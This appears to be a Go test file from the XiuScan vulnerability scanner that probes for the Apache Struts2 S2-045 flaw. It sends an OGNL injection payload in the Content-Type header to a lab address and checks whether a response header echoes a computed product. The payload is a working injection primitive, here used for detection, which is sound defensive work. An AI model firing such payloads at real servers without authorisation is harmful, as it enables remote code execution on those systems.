package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strconv"
	"strings"
	"testing"
)

func TestS2045(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "__rand_1__*__rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	payload := "%{#context['com.opensymphony.xwork2.dispatcher.Htt" +
		"pServletResponse'].addHeader('xiuscan',__cmd__)}.multipart/form-data"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	headers := make(map[string]string)
	headers["Content-Type"] = payload
	headers["Content-Length"] = "0"
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080"),
		Method:  "GET",
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if strings.Contains(resp.Headers["Xiuscan"], strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-045")
	}
}
